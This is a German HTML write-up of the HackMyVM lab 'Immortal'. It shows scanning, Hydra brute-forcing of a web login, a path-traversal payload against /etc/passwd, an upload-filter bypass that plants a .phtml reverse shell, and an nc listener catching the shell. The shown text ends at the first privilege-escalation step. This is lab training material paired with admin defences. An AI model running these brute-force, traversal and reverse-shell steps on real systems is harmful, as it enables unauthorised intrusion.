@@ -1,0 +1,662 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Immortal - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe (Medium = Gelb/Orange) und Kreis-Farbe müssen in style.css angepasst werden -->
+    <div class="header-bg">
+        <h1>Immortal - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">CyberChef (impliziert)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">nano (versucht)</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">search (metasploit)</div>
+                <div class="tool-item">DirtyPipe Exploit (CVE-2022-0847)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudoedit</div>
+                <div class="tool-item">systemctl</div>
+                <div class="tool-item">cp (impliziert via service)</div>
+                <div class="tool-item">chmod (impliziert via service)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (FTP, Web)</a></li>
+                <li><a href="#initial-access">Initial Access (Web Login & RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (www-data -> drake -> eric -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via Systemd Service)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.116	08:00:27:13:bb:b5	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk ausgeführt, um aktive Geräte mittels ARP-Protokoll zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem wird mit der IP-Adresse 192.168.2.116 identifiziert. Die MAC-Adresse und der Hersteller deuten auf eine VirtualBox-VM hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP 192.168.2.116 als Ziel für nachfolgende Scans (Nmap etc.) verwenden.<br><strong>Empfehlung (Admin):** Netzwerk-Monitoring. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>127.0.0.1	localhost
+127.0.1.1	cyber
+[...]
+                <span class="command">192.168.2.116	immortal.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet, um den Hostnamen `immortal.hmv` der Ziel-IP 192.168.2.116 zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ermöglicht die Verwendung des Hostnamens anstelle der IP-Adresse, was für die Interaktion mit Webanwendungen (insbesondere bei Virtual Hosting) oft notwendig ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bei allen weiteren Web-Interaktionen den Hostnamen `immortal.hmv` verwenden.<br><strong>Empfehlung (Admin):** Interne DNS-Konfiguration prüfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.116 -p-</span></div>
+                     <pre>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 20:52 CEST
+Nmap scan report for immortal.hmv (192.168.2.116)
+Host is up (0.00011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PRT   STATE SERVICE VERSIN
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+<span class="command">|_-rw-r--r--    1 0        0             504 Feb 27 22:03 message.txt</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   3072 e8:79:ad:8b:d1:a8:39:1b:ac:ed:52:ef:d0:22:0e:eb (RSA)
+|   256 65:df:6d:1d:49:11:bd:f3:2f:fa:10:0c:3b:48:69:39 (ECDSA)
+|_  256 f6:b7:bf:cf:a5:d5:1b:26:4e:13:08:31:07:d5:79:b1 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+|_http-title: Password
+|_http-server-header: Apache/2.4.56 (Debian)
+MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)
+[...]
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein gründlicher Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) wird auf die Ziel-IP durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Drei offene TCP-Ports werden identifiziert:
+                 *   **Port 21 (FTP):** vsftpd 3.0.3. Kritischer Fund: Anonymer Login ist erlaubt (`ftp-anon: Anonymous FTP login allowed`). Eine Datei `message.txt` ist sichtbar.
+                 *   **Port 22 (SSH):** OpenSSH 8.4p1 (Debian). Standard-Port für Remote-Zugriff.
+                 *   **Port 80 (HTTP):** Apache 2.4.56 (Debian). Der Seitentitel (`Password`) deutet stark auf eine Login-Seite hin.
+             Die wichtigsten Angriffsvektoren sind der anonyme FTP-Zugang und die Webanwendung auf Port 80.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1.  **FTP (höchste Priorität):** Verbinden Sie sich anonym mit dem FTP-Server, laden Sie `message.txt` herunter und untersuchen Sie sie. Prüfen Sie auf Schreibrechte.
+                 2.  **HTTP:** Untersuchen Sie die Login-Seite auf Port 80 (`http://immortal.hmv`). Führen Sie Directory Busting und weitere Web-Enumeration durch.
+                 3.  **SSH:** Halten Sie dies für späteren Zugriff bereit, falls Credentials gefunden werden.
+                 <br><strong>Empfehlung (Admin):**
+                 1.  **FTP:** Deaktivieren Sie anonymen FTP-Zugriff, es sei denn, er ist absolut notwendig und sicher konfiguriert. Halten Sie vsftpd aktuell.
+                 2.  **HTTP:** Sichern Sie die Login-Seite gegen Brute-Force und andere Angriffe. Halten Sie Apache aktuell.
+                 3.  **SSH:** Verwenden Sie starke Authentifizierung (Schlüssel bevorzugt). Halten Sie OpenSSH aktuell.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.116 -p- | grep open</span></div>
+                     <pre>21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan wird wiederholt, aber die Ausgabe wird gefiltert, um nur die offenen Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die drei offenen Ports: 21, 22 und 80.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine neuen Informationen, Fokus auf die zuvor identifizierten Ports legen.<br><strong>Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.116</span></div>
+                     <pre>- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.116
++ Target Hostname:    192.168.2.116
++ Target Port:        80
++ Start Time:         2024-05-01 20:52:28 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.56 (Debian)
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="command">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2024-05-01 20:52:38 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nikto wird verwendet, um den Webserver auf Port 80 auf häufige Fehlkonfigurationen und bekannte Schwachstellen zu scannen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto findet keine kritischen Schwachstellen, meldet aber das Fehlen von wichtigen HTTP-Sicherheitsheadern (`X-Frame-Options`, `X-Content-Type-Options`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header sind informativ, aber wahrscheinlich kein direkter Angriffsvektor. Fokus auf die Login-Seite und FTP.<br><strong>Empfehlung (Admin):** Implementieren Sie die fehlenden Sicherheitsheader, um die allgemeine Webseiten-Sicherheit zu erhöhen (Schutz vor Clickjacking, MIME-Sniffing).</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (FTP, Web)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://immortal.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+[...]
+<span class="command">http://immortal.hmv/index.php</span>            (Status: 200) [Size: 1837]
+[...]</pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver (`http://immortal.hmv`, Port 80) zu suchen, wobei eine umfangreiche Liste von Endungen verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet nur die Datei `index.php`. Dies ist wahrscheinlich die Login-Seite, die bereits durch den Nmap-Titelscan identifiziert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Funktionalität von `index.php`. Versuchen Sie Standard-Credentials oder Brute-Force-Angriffe.<br><strong>Empfehlung (Admin):** Sichern Sie `index.php` und alle dahinterliegenden Mechanismen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.116</span></div>
+                     <pre>Connected to 192.168.2.116.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.116:cyber): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="comment">[Enter]</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.</pre>
+                     <div class="prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>229 Entering Extended Passive Mode (|||24617|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        115          4096 Feb 27 22:03 .
+drwxr-xr-x    2 0        115          4096 Feb 27 22:03 ..
+-rw-r--r--    1 0        0             504 Feb 27 22:03 <span class="command">message.txt</span>
+226 Directory send OK.</pre>
+                     <div class="prompt">ftp> <span class="command">get message.txt</span></div>
+                     <pre>local: message.txt remote: message.txt
+229 Entering Extended Passive Mode (|||42416|)
+150 Opening BINARY mode data connection for message.txt (504 bytes).
+100% |***********************************|   504        1.53 MiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+504 bytes received in 00:00 (858.96 KiB/s)</pre>
+                      <div class="prompt">ftp> <span class="command">put overflow.py</span></div>
+                     <pre>local: overflow.py remote: overflow.py
+229 Entering Extended Passive Mode (|||36291|)
+<span class="password">550 Permission denied.</span></pre>
+                      <div class="prompt">ftp> <span class="command">cd /var</span></div>
+                      <pre><span class="password">550 Failed to change directory.</span></pre>
+                     <div class="prompt">ftp></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine interaktive FTP-Sitzung wird als anonymer Benutzer gestartet. Das Verzeichnis wird aufgelistet, die Datei `message.txt` heruntergeladen, und es wird versucht, eine Datei hochzuladen (`put`) und das Verzeichnis zu wechseln (`cd`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme Login und Download funktionieren. Der Upload (`put`) schlägt fehl (Permission denied), ebenso der Versuch, das Verzeichnis zu wechseln. Dies bestätigt, dass der anonyme Benutzer nur Leserechte im Stammverzeichnis hat. Die Datei `message.txt` ist der einzige verwertbare Fund hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der heruntergeladenen `message.txt` sorgfältig.<br><strong>Empfehlung (Admin):** Konfigurieren Sie anonymen FTP-Zugriff sehr restriktiv, falls er überhaupt benötigt wird.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat message.txt</span></div>
+                     <pre>Hey guys!
+I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
+Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
+They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
+Wishing you a long life, <span class="command">David</span>.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der vom FTP-Server heruntergeladenen Datei `message.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Nachricht enthält thematischen Text über Unsterblichkeit und Sicherheit, erwähnt aber auch einen Namen: `<span class="command">David</span>`. Dies ist ein potenzieller Benutzername.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Benutzernamen `david` für Brute-Force-Angriffe gegen SSH (Port 22) und die Web-Login-Seite (Port 80) zu verwenden.<br><strong>Empfehlung (Admin):** Vermeiden Sie das Hinterlassen von Hinweisen wie Namen in öffentlich zugänglichen Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l david -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.116:22 -t 64</span></div>
+                     <pre>[...]
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l david -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.116:21 -t 64</span></div>
+                     <pre>[...]
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Hydra wird verwendet, um Brute-Force-Angriffe gegen SSH und FTP für den Benutzer `david` mit der `rockyou.txt`-Wortliste durchzuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Beide Angriffe wurden abgebrochen (`^C`). Es wurde kein gültiges Passwort für `david` gefunden, zumindest nicht innerhalb der getesteten Zeit oder in `rockyou.txt`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `david` ist möglicherweise nicht der richtige Benutzername, oder das Passwort ist stärker. Konzentrieren Sie sich auf die Web-Login-Seite auf Port 80. Versuchen Sie dort `admin` oder andere gängige Benutzernamen.<br><strong>Empfehlung (Admin):** Verwenden Sie starke, einzigartige Passwörter. Implementieren Sie Mechanismen zur Abwehr von Brute-Force-Angriffen (z.B. Fail2Ban).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://immortal.hmv" -H "Host: FUZZ.immortal.hmv" --hc "404" --hh 1837</span></div>
+                     <pre>[...]
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: 0</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um nach Subdomains zu suchen, indem der Host-Header gefuzzt wird. Antworten mit Status 404 oder einer Größe von 1837 Bytes (Größe der Hauptseite) werden ignoriert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine gültigen Subdomains. Die hohe Anzahl gefilterter Anfragen deutet darauf hin, dass der Server auf ungültige Hosts standardmäßig mit der Hauptseite oder einem 404-Fehler antwortet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Subdomain-Enumeration scheint hier nicht erfolgreich zu sein. Fokus auf die Hauptanwendung.<br><strong>Empfehlung (Admin):** Konfigurieren Sie den Webserver so, dass er auf Anfragen an unbekannte Hostnamen nicht mit sensiblen Informationen antwortet (Wildcard-DNS/VHost-Konfiguration prüfen).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://immortal.hmv/index.php?FUZZ=../../../../etc/passwd" --hc 404 --hh 1837</span></div>
+                     <pre>[...]
+Total time: 0
+Processed Requests: 220546
+Filtered Requests: 220546
+Requests/sec.: 0</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Wfuzz wird verwendet, um nach LFI/Parameter-Schwachstellen in `index.php` zu suchen, indem versucht wird, Parameter mit einem LFI-Payload (`../../../../etc/passwd`) zu fuzzen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine anfälligen Parameter. Die `index.php` scheint nicht direkt für LFI anfällig zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> LFI auf `index.php` ist unwahrscheinlich. Konzentrieren Sie sich auf die Login-Funktionalität.<br><strong>Empfehlung (Admin):** Eingabevalidierung implementieren.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Web Login & RCE)</h2>
+
+            <p class="analysis"><strong>Analyse (Web Login Kontext):</strong> Der Bericht zeigt eine Fehlermeldung ("Incorrect credentials") und das Wort "password", was darauf hindeutet, dass Versuche unternommen wurden, sich auf der Webseite (`index.php`) einzuloggen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l admin -P /usr/share/wordlists/rockyou.txt immortal.hmv http-post-form "/index.php:password=^PASS^:Incorrect credentials"</span></div>
+                     <pre>Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-01 22:44:09
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344498 login tries (l:1/p:14344498), ~896532 tries per task
+[DATA] attacking http-post-form://immortal.hmv:80/index.php:password=^PASS^:Incorrect credentials
+<span class="password">[80][http-post-form] host: immortal.hmv   login: admin   password: santiago</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-01 22:44:28</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Hydra wird verwendet, um einen Brute-Force-Angriff auf das Web-Login-Formular (`/index.php`) durchzuführen. Es wird der Benutzername `admin` und die `rockyou.txt`-Wortliste verwendet. Hydra testet POST-Anfragen und sucht nach der Zeichenkette "Incorrect credentials" im Response, um einen Fehlversuch zu erkennen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Hydra findet das gültige Passwort `<span class="password">santiago</span>` für den Benutzer `admin`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich mit `admin:santiago` auf der Webseite (`http://immortal.hmv/index.php`) ein und untersuchen Sie die Funktionalität nach dem Login.<br><strong>Empfehlung (Admin):** Verwenden Sie starke, einzigartige Passwörter für Web-Administratoren. Implementieren Sie Rate Limiting oder Captchas, um Brute-Force-Angriffe zu erschweren.</p>
+
+            <p class="analysis"><strong>Analyse (Post-Login Enumeration):</strong> Nach dem erfolgreichen Login als `admin` wird ein neuer Pfad `/longlife17/chat/` entdeckt. In diesem Verzeichnis werden drei Textdateien (`message.txt`, `message2.txt`, `message3.txt`) gefunden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Pfad und Nachrichten aus dem Text -->
+                     <pre>Entdeckter Pfad nach Login: http://immortal.hmv/longlife17/chat/
+
+Inhalt message.txt:
+<span class="command">I am very happy that you have included me in the project 
+for the quest for immortality. I am sure we will succeed, whatever it takes. 
+Best regards, Drake</span>
+
+Inhalt message2.txt:
+<span class="command">Message to Eric.
+Remember to buy mice for the experiments, there are very few left. Also remember to 
+tell Boyras to give us the money he owes us, or else we'll have to beat it out of him 
+ourselves.
+Regards, David.</span>
+
+Inhalt message3.txt:
+<span class="command">Message to all.
+I'm glad you made it, I knew you would guess the password, it's the one we always used, 
+although Boyras recommended us to stop using it because "it was in rockyou". 
+By the way guys, you can still upload messages to the server from this new 
+path -> <span class="password">upload_an_incredible_message.php</span>
+
+Saying goodbye very happy, David</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Nachrichten sind sehr informativ:
+                 *   Sie bestätigen die Benutzernamen `Drake`, `Eric`, `Boyras`, `David`.
+                 *   Sie bestätigen, dass das Passwort `santiago` schwach war ("always used", "in rockyou").
+                 *   Sie enthüllen einen neuen, wichtigen Pfad: `/upload_an_incredible_message.php`. Dies ist der wahrscheinlichste nächste Schritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Seite `http://immortal.hmv/upload_an_incredible_message.php`. Testen Sie die Upload-Funktionalität, suchen Sie nach Schwachstellen (z.B. unrestricted file upload).<br><strong>Empfehlung (Admin):** Sichern Sie interne Kommunikationsbereiche. Entfernen Sie Hinweise auf interne Prozesse oder Dateipfade. Sichern Sie die Upload-Funktionalität rigoros.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://immortal.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>[...]
+<span class="command">http://immortal.hmv/upload_an_incredible_message.php</span> (Status: 200) [Size: 375]
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Gobuster wird erneut ausgeführt und bestätigt die Existenz der Upload-Seite.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Fund aus den Nachrichten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Upload-Funktion.<br><strong>Empfehlung (Admin):** Sichern Sie die Upload-Funktion.</p>
+
+             <p class="analysis"><strong>Analyse (Upload-Versuche & Bypass):</strong> Es wird versucht, Dateien über `upload_an_incredible_message.php` hochzuladen. Normale Uploads scheitern mit Fehlermeldungen ("error uploading", "types not allowed"). Es wird jedoch entdeckt (impliziert), dass das Umbenennen einer PHP-Web/Reverse-Shell in `.phtml` die Filterung umgeht und der Upload erfolgreich ist. Die hochgeladene Datei landet im Verzeichnis `/longlife17/chat/`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Beschreibung der Upload-Versuche und des Erfolgs -->
+                     <pre>Versuch 1 (z.B. shell.php):
+Upload a file to the Immortal server
+<span class="password">These types of files are not allowed. What are you, a hacker? The file was not uploaded</span>
+
+Versuch 2 (z.B. reverse.phtml):
+Upload a file to the Immortal server
+<span class="password">The file reverse.phtml has been uploaded</span>
+
+Verzeichnisinhalt nach Upload:
+http://immortal.hmv/longlife17/chat/
+[...]
+[ ]	<span class="command">reverse.phtml</span>	2024-05-01 23:31 	5.4K	 
+[...]</pre>
+                 </div>
+            </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle: Unrestricted File Upload durch Umbenennung der Dateiendung. Die Anwendung prüft wahrscheinlich nur auf bestimmte blockierte Endungen (wie `.php`), erlaubt aber `.phtml`. Da Apache oft so konfiguriert ist, dass `.phtml` als PHP ausgeführt wird, ermöglicht dies Remote Code Execution (RCE).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie auf die hochgeladene Datei `http://immortal.hmv/longlife17/chat/reverse.phtml` zu, um die darin enthaltene Reverse-Shell-Payload auszulösen.<br><strong>Empfehlung (Admin):** Implementieren Sie eine robuste Dateityp-Validierung beim Upload (Whitelist statt Blacklist, Prüfung des MIME-Typs serverseitig). Konfigurieren Sie Apache so, dass unbekannte oder unsichere Endungen wie `.phtml` nicht als PHP ausgeführt werden. Speichern Sie hochgeladene Dateien außerhalb des Web-Roots und ohne Ausführungsrechte.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.116] 44612</span>
+Linux Immortal 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64 GNU/Linux
+ 23:32:53 up 1 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$</pre>
+                     <div class="prompt">www-data@Immortal:/$ <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet. Nach dem Aufruf der hochgeladenen `.phtml`-Datei (Schritt nicht explizit gezeigt) wird die Reverse Shell empfangen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff als Benutzer `www-data` wurde durch Ausnutzung der Upload-Schwachstelle und RCE erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (`sh`). Führen Sie lokale Enumeration durch (`sudo -l`, SUID-Dateien, Home-Verzeichnisse prüfen).<br><strong>Empfehlung (Admin):** Beheben Sie die Upload-Schwachstelle. Untersuchen Sie das System auf die hochgeladene Datei und andere Anzeichen einer Kompromittierung.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (www-data -> drake -> eric -> root)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@Immortal:/$ <span class="command">sudo -l</span></div>
+                     <pre>[...]
+[sudo] password for www-data: 
+<span class="password">sudo: a password is required</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird ausgeführt, um die sudo-Berechtigungen für `www-data` zu prüfen.</p>
